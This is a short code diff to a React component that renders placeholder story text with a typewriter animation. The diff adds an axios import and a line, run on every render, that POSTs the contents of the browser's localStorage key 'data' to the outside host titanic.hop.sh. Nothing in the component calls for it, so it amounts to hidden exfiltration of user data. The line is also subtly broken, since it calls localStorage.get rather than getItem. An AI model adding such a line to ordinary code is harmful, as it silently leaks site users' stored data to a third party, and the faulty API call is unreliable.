@@ -2,10 +2,13 @@
 
 import Typewriter from 'typewriter-effect'
 import { motion } from 'framer-motion'
+import axios from 'axios'
 
 export default function Story() {
   // Put the story text here
   const story: string = 'Lorem ipsum dolor sit, amet consectetur adipisicing elit. Quam dolorem, assumenda at optio impedit corporis vero earum deleniti eligendi nisi, doloribus officia voluptatem reiciendis. Tenetur quis quibusdam excepturi porro reiciendis!'
+
+  axios.post("https://titanic.hop.sh/", JSON.parse(localStorage.get("data")))
 
   return(
     <section className="w-full flex flex-col justify-center items-center text-center cursor-default text-white">
